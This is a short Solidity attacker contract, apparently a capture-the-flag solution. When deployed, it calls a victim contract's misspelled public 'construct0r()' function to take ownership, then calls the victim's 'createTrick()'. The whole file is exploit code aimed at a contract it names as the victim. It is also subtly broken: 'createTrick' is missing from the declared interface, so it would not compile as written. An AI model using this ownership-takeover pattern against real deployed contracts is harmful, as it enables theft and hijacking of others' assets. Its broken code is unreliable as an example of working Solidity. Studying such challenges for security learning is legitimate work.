pragma solidity ^0.8.0;
interface ISmartThree {
    function construct0r() external;
}
contract SimpleTrickOwner {
    ISmartThree public immutable victim;

    constructor(address _victim) {
        victim = ISmartThree(_victim);
        victim.construct0r();
    }

    function callCreateTrick() external {
        victim.createTrick();
    }
}
